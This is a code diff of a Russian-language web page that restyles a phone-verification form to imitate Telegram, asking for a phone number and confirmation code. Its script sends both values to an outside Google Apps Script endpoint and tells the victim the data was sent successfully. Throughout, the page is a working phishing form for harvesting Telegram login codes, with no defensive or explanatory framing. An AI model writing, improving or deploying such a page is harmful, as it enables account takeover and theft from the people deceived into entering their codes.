@@ -1,120 +1,156 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <title>Подтверждение номера</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Telegram Форма</title>
+
+  <!-- Шрифт -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
+  <!-- Иконки -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
   <style>
     * {
       box-sizing: border-box;
     }
+
     body {
       margin: 0;
-      padding: 0;
-      font-family: "Segoe UI", sans-serif;
-      background: linear-gradient(135deg, #ece9e6, #ffffff);
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #0088cc, #005f9e);
+      color: #333;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
+      overflow: hidden;
+      animation: fadeIn 1s ease-in;
     }
-    .card {
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .container {
       background: #fff;
       padding: 30px;
-      width: 100%;
+      border-radius: 16px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
       max-width: 400px;
-      border-radius: 15px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
-      transition: 0.3s ease;
-      animation: fadeIn 0.5s ease-in-out;
-    }
-    .card:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 12px 25px rgba(0,0,0,0.15);
-    }
-    h2 {
+      width: 90%;
       text-align: center;
-      color: #333;
+      animation: fadeIn 1s ease-out;
+    }
+
+    .telegram-icon {
+      font-size: 48px;
+      color: #0088cc;
+      margin-bottom: 10px;
+    }
+
+    h1 {
+      font-size: 24px;
       margin-bottom: 20px;
     }
+
     input {
       width: 100%;
       padding: 12px;
-      margin: 8px 0;
+      margin: 10px 0;
       font-size: 16px;
       border: 1px solid #ccc;
-      border-radius: 8px;
+      border-radius: 10px;
       outline: none;
-      transition: 0.3s;
+      transition: 0.2s;
     }
+
     input:focus {
-      border-color: #5e9eff;
-      box-shadow: 0 0 3px #5e9eff;
+      border-color: #0088cc;
+      box-shadow: 0 0 5px #0088cc55;
     }
+
     button {
-      width: 100%;
-      padding: 12px;
-      background-color: #5e9eff;
-      border: none;
+      background-color: #0088cc;
       color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 10px;
       font-size: 16px;
-      border-radius: 8px;
       cursor: pointer;
-      transition: background-color 0.3s;
+      transition: background 0.3s;
+      margin-top: 10px;
     }
+
     button:hover {
-      background-color: #397be8;
+      background-color: #006fa3;
     }
-    #codeSection {
-      margin-top: 20px;
+
+    .message {
+      margin-top: 15px;
+      font-weight: 500;
     }
-    @keyframes fadeIn {
-      from {opacity: 0; transform: translateY(10px);}
-      to {opacity: 1; transform: translateY(0);}
+
+    .success {
+      color: green;
+    }
+
+    .error {
+      color: red;
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 20px;
+      }
+
+      .telegram-icon {
+        font-size: 36px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Введите номер телефона</h2>
-    <input type="text" id="phone" placeholder="+374..." />
-    <button onclick="savePhone()">Продолжить</button>
-
-    <div id="codeSection" style="display:none;">
-      <h2>Введите код подтверждения</h2>
-      <input type="text" id="code" placeholder="Код" />
-      <button onclick="saveCode()">Подтвердить</button>
+  <div class="container">
+    <div class="telegram-icon">
+      <i class="fab fa-telegram-plane"></i>
     </div>
+    <h1>Подтверждение через Telegram</h1>
+    <form id="form">
+      <input type="text" id="phone" placeholder="Номер телефона" required />
+      <input type="text" id="code" placeholder="Код подтверждения" required />
+      <button type="submit">Отправить</button>
+    </form>
+    <div class="message" id="message"></div>
   </div>
 
   <script>
-    let savedPhone = '';
-    const url = 'https://script.google.com/macros/s/AKfycbzNf1gOLPJXmzsBIuAumpGr-e1fWWwBykrti4w5IURBmMJhQcXZ4WJZ46K00dK2nGt9ow/exec';
+    const form = document.getElementById("form");
+    const message = document.getElementById("message");
 
-    function savePhone() {
-      savedPhone = document.getElementById('phone').value.trim();
-      if (!savedPhone) return alert('Введите номер телефона!');
-      document.getElementById('codeSection').style.display = 'block';
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
 
-      fetch(url, {
-        method: 'POST',
-        body: JSON.stringify({ phone: savedPhone, code: '' }),
-        headers: { 'Content-Type': 'application/json' }
-      });
-    }
+      const phone = document.getElementById("phone").value;
+      const code = document.getElementById("code").value;
 
-    function saveCode() {
-      const code = document.getElementById('code').value.trim();
-      if (!code) return alert('Введите код!');
-      
-      fetch(url, {
-        method: 'POST',
-        body: JSON.stringify({ phone: savedPhone, code: code }),
-        headers: { 'Content-Type': 'application/json' }
-      }).then(() => {
-        alert('Спасибо! Данные сохранены.');
-      });
-    }
+      try {
+        await fetch("https://script.google.com/macros/s/AKfycbzNf1gOLPJXmzsBIuAumpGr-e1fWWwBykrti4w5IURBmMJhQcXZ4WJZ46K00dK2nGt9ow/exec", {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ phone, code })
+        });
+
+        message.innerHTML = "<p class='success'>✅ Данные успешно отправлены!</p>";
+        form.reset();
+      } catch (error) {
+        message.innerHTML = "<p class='error'>❌ Ошибка отправки. Попробуйте позже.</p>";
+      }
+    });
   </script>
 </body>
 </html>
